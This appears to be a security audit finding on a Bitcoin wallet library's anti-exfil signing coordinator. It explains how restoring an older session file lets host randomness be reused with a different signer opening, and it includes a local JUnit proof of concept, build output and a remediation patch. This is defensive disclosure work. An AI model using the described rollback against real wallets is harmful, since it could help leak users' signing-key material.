            AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
            if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
            AntiExfilCodec.validateTransition(commit, openings);
            List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
            for(AntiExfilSlot slot : openings.getSlots()) {
                AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                byte[] rho = state.rhos.get(identifier);
                if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                        slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
            }
            AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                    openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
            AntiExfilCodec.validateTransition(openings, reveal);
            byte[] message3 = AntiExfilCodec.encode(reveal);
            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                    state.message1, encodedOpenings, message3, null, null, state.rhos);
            // This durable write is the security boundary: no rho is returned before it succeeds.
            AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
            return message3.clone();
        });
```
⋯
#### Lines 227-268 — _Validation establishes internal consistency but no monotonic freshness._

```
    private State readValidatedState() {
        return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
    }

    private State readValidatedStateUnlocked() throws IOException {
        if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
        State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
        validateState(state);
        return state;
    }

    private void validateState(State state) {
        if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
        List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
        AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
        AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                commit.getNetwork(), commit.getSessionId(), state.rhos);
        if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
        if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
        if(state.phase == Phase.COMMITMENTS_CREATED) {
            if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
            return;
        }
        if(state.message2 == null || state.message3 == null) invalidPhase();
        AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
        AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
        AntiExfilCodec.validateTransition(commit, openings);
        AntiExfilCodec.validateTransition(openings, reveal);
        for(AntiExfilSlot slot : reveal.getSlots()) {
            byte[] expected = state.rhos.get(identifier(slot));
            if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
        }
        if(state.phase == Phase.OPENINGS_ACCEPTED) {
            if(state.message4 != null || state.signedPsbt != null) invalidPhase();
            return;
        }
        if(state.message4 == null || state.signedPsbt == null) invalidPhase();
        AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
        AntiExfilCodec.validateTransition(reveal, signatures);
        byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
        if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
    }
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
#### Lines 41-47 — _An exact older body remains valid under the unkeyed checksum._

```
    static byte[] read(Path path, int maximumBytes) throws IOException {
        byte[] encoded = Files.readAllBytes(path);
        if(encoded.length < 32 || encoded.length > maximumBytes) throw new IOException("State length is outside limits");
        byte[] body = Arrays.copyOf(encoded, encoded.length - 32);
        byte[] checksum = Arrays.copyOfRange(encoded, encoded.length - 32, encoded.length);
        if(!Arrays.equals(Sha256Hash.hash(body), checksum)) throw new IOException("State checksum mismatch");
        return body;
```
## Description

All phase and host-randomness consumption state is stored in one replaceable, checksummed session file. An actor able to restore a byte-for-byte snapshot taken in `COMMITMENTS_CREATED` after `acceptOpenings` has disclosed message 3 produces a file that passes checksum, wallet-identity, transcript, and randomness validation. The coordinator has no authenticated monotonic generation, external consumed marker, or journal linkage that distinguishes that older authentic snapshot from the newest state. On reload, the retry guard is skipped because the restored phase has no accepted opening. A different opening can then be persisted and paired with the same previously disclosed host randomness.
## Root cause

The durable state provides corruption detection but no freshness or anti-rollback protection, and the consumed-secret marker resides only in the rollbackable file itself.
## Impact

A filesystem rollback permits multiple signer transcripts for one host commitment and defeats the one-opening-before-reveal invariant. A malicious signer colluding with the filesystem actor can regain nonce choice and leak signing-key material through otherwise valid signatures.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void restoredCommitmentSnapshotDisclosesSameRhoForDifferentSignerOpening() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        Keystore keystore = keystore();
        Path session = temporary.resolve("rollback.aexs");
        Path journal = temporary.resolve("rollback.aexj");

        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4);
        AntiExfilMessage commit = AntiExfilCodec.decode(coordinator.getHostCommitMessage());
        byte[] commitmentCreatedSnapshot = Files.readAllBytes(session);

        byte[] openingA = encodedOpeningsFor(commit, openingPoint(2));
        byte[] openingB = encodedOpeningsFor(commit, openingPoint(3));
        assertFalse(Arrays.equals(openingA, openingB), "the signer controls a different stage-2 opening transcript");

        byte[] revealA = coordinator.acceptOpenings(openingA);
        AntiExfilException protectedRetry = assertThrows(AntiExfilException.class, () -> coordinator.acceptOpenings(openingB));
        assertEquals(AntiExfilException.Code.RETRY_CONFLICT, protectedRetry.getCode(),
                "without rollback the durable OPENINGS_ACCEPTED phase rejects a changed opening");

        Files.write(session, commitmentCreatedSnapshot);
        AntiExfilCoordinator rolledBack = AntiExfilCoordinator.load(session, journal, keystore);
        assertEquals(AntiExfilCoordinator.Phase.COMMITMENTS_CREATED, rolledBack.getStatus().getPhase(),
                "the authentic older session file passes checksum and state validation after restore");

        byte[] revealB = rolledBack.acceptOpenings(openingB);
        AntiExfilMessage decodedRevealA = AntiExfilCodec.decode(revealA);
        AntiExfilMessage decodedRevealB = AntiExfilCodec.decode(revealB);
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openingA), decodedRevealA);
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openingB), decodedRevealB);

        assertEquals(decodedRevealA.getSlots().size(), decodedRevealB.getSlots().size());
        for(int i = 0; i < decodedRevealA.getSlots().size(); i++) {
            AntiExfilSlot slotA = decodedRevealA.getSlots().get(i);
            AntiExfilSlot slotB = decodedRevealB.getSlots().get(i);
            assertFalse(Arrays.equals(slotA.getOpening(), slotB.getOpening()),
                    "the second accepted transcript uses a different signer opening");
            assertArrayEquals(slotA.getHostRandomness(), slotB.getHostRandomness(),
                    "rollback lets the coordinator disclose the exact same rho for that different opening");
        }
    }

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    private static byte[] encodedOpeningsFor(AntiExfilMessage commit, byte[] opening) {
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : commit.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), opening, null, null));
        }
        return AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), openingSlots));
    }

    private static byte[] openingPoint(long scalar) {
        return ECKey.fromPrivate(BigInteger.valueOf(scalar), true).getPubKey();
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 19 lines & 0.6396484375 KB skipped]
> Task :processResources UP-TO-DATE
> Task :classes UP-TO-DATE
> Task :compileTestJava UP-TO-DATE
> Task :processTestResources UP-TO-DATE
> Task :testClasses UP-TO-DATE
> Task :test

BUILD SUCCESSFUL in 1s
5 actionable tasks: 1 executed, 4 up-to-date
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC passed with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`. It executes the real coordinator/codec/durable-file path, snapshots the authentic COMMITMENTS_CREATED session file, accepts opening A, confirms changed-opening retry is rejected without rollback, restores the snapshot, reloads successfully, accepts opening B, and asserts each slot reveals the same host randomness under a different signer opening. It does not generate final colluding signer signatures or demonstrate private-key extraction; it proves the broken one-opening-before-reveal invariant that enables that cryptographic attack condition.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Persist a wallet-bound, session-specific hash of the first accepted openings in the separate durable journal before revealing rho. Reloads of a rolled-back COMMITMENTS_CREATED session may retry the identical opening, but a different opening is rejected; internal consumption markers are excluded from the public abort-event API.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
@@ -1,138 +1,168 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
 public final class AntiExfilAbortJournal {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'J'};
     private static final int VERSION = 1;
     private static final int MAX_FILE_BYTES = 4 * 1024 * 1024;
     private static final int MAX_EVENTS = 10_000;
     private static final int MAX_REASON_BYTES = 512;
+    private static final String OPENING_MARKER_PREFIX = "OPENING:";
 
     private final Path path;
     private final byte[] walletIdentity;
 
     public AntiExfilAbortJournal(Path path, byte[] walletIdentity) {
         if(path == null || walletIdentity == null || walletIdentity.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort-journal identity");
         }
         this.path = path;
         this.walletIdentity = walletIdentity.clone();
     }
 
     public List<AbortEvent> getEvents() {
-        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
+        return AntiExfilDurableFiles.locked(path, () -> loadOrCreate().events.stream()
+                .filter(event -> !event.reason.startsWith(OPENING_MARKER_PREFIX))
+                .toList());
     }
 
+    void reserveOpening(byte[] sessionId, byte[] psbtDigest, byte[] encodedOpenings) {
+        if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32
+                || encodedOpenings == null) {
+            throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid opening-consumption context");
+        }
+        String marker = OPENING_MARKER_PREFIX + java.util.Base64.getEncoder().encodeToString(
+                com.sparrowwallet.drongo.protocol.Sha256Hash.hash(encodedOpenings));
+        AntiExfilDurableFiles.locked(path, () -> {
+            Journal journal = loadOrCreate();
+            for(AbortEvent event : journal.events) {
+                if(Arrays.equals(sessionId, event.sessionId) && Arrays.equals(psbtDigest, event.psbtDigest)
+                        && event.reason.startsWith(OPENING_MARKER_PREFIX)) {
+                    if(!event.reason.equals(marker)) {
+                        throw new AntiExfilException(AntiExfilException.Code.RETRY_CONFLICT,
+                                "Host randomness was already consumed by different signer openings");
+                    }
+                    return null;
+                }
+            }
+            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
+            List<AbortEvent> updated = new ArrayList<>(journal.events);
+            updated.add(new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(), marker));
+            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
+            return null;
+        });
+    }
+
     AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
         if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
         }
         byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
         if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
         }
         return AntiExfilDurableFiles.locked(path, () -> {
             Journal journal = loadOrCreate();
             if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
             AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
                     new String(reasonBytes, StandardCharsets.UTF_8));
             List<AbortEvent> updated = new ArrayList<>(journal.events);
             updated.add(event);
             AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
             return event;
         });
     }
 
     private Journal loadOrCreate() throws IOException {
         if(!Files.exists(path)) {
             Journal journal = new Journal(walletIdentity, List.of());
             AntiExfilDurableFiles.write(path, encode(journal), true);
             return journal;
         }
         Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
         if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
         return journal;
     }
 
     private static byte[] encode(Journal journal) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.write(journal.walletIdentity);
             output.writeInt(journal.events.size());
             for(AbortEvent event : journal.events) {
                 byte[] reason = event.reason.getBytes(StandardCharsets.UTF_8);
                 output.write(event.sessionId);
                 output.write(event.psbtDigest);
                 output.writeLong(event.recordedAtEpochSecond);
                 output.writeShort(reason.length);
                 output.write(reason);
             }
         }
         return bytes.toByteArray();
     }
 
     private static Journal decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             byte[] magic = input.readNBytes(4);
             if(!Arrays.equals(magic, MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown abort-journal format");
             byte[] identity = input.readNBytes(32);
             int count = input.readInt();
             if(identity.length != 32 || count < 0 || count > MAX_EVENTS) throw new IOException("Invalid abort-journal header");
             List<AbortEvent> events = new ArrayList<>(count);
             for(int i = 0; i < count; i++) {
                 byte[] sessionId = input.readNBytes(32);
                 byte[] digest = input.readNBytes(32);
                 long timestamp = input.readLong();
                 int reasonLength = input.readUnsignedShort();
                 byte[] reason = input.readNBytes(reasonLength);
                 if(sessionId.length != 32 || digest.length != 32 || reasonLength < 1
                         || reasonLength > MAX_REASON_BYTES || reason.length != reasonLength || timestamp < 0) {
                     throw new IOException("Invalid abort-journal event");
                 }
                 events.add(new AbortEvent(sessionId, digest, timestamp, new String(reason, StandardCharsets.UTF_8)));
             }
             if(input.available() != 0) throw new IOException("Trailing abort-journal data");
             return new Journal(identity, events);
         } catch(EOFException e) {
             throw new IOException("Truncated abort journal", e);
         }
     }
 
     public static final class AbortEvent {
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final long recordedAtEpochSecond;
         private final String reason;
 
         private AbortEvent(byte[] sessionId, byte[] psbtDigest, long recordedAtEpochSecond, String reason) {
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.recordedAtEpochSecond = recordedAtEpochSecond;
             this.reason = reason;
         }
 
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public long getRecordedAtEpochSecond() { return recordedAtEpochSecond; }
         public String getReason() { return reason; }
     }
 
     private record Journal(byte[] walletIdentity, List<AbortEvent> events) {
     }
 }

diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,452 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                 AntiExfilCodec.encode(commit), null, null, null, null, rhos);
         List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
             throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
         }
         AntiExfilDurableFiles.locked(sessionPath, () -> {
             AntiExfilDurableFiles.write(sessionPath, encode(state), true);
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
+            new AntiExfilAbortJournal(journalPath, walletIdentity).reserveOpening(
+                    commit.getSessionId(), commit.getPsbtDigest(), encodedOpenings);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                     state.message1, encodedOpenings, message3, null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                     AntiExfilCodec.decode(state.message1), signatures, state.rhos);
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
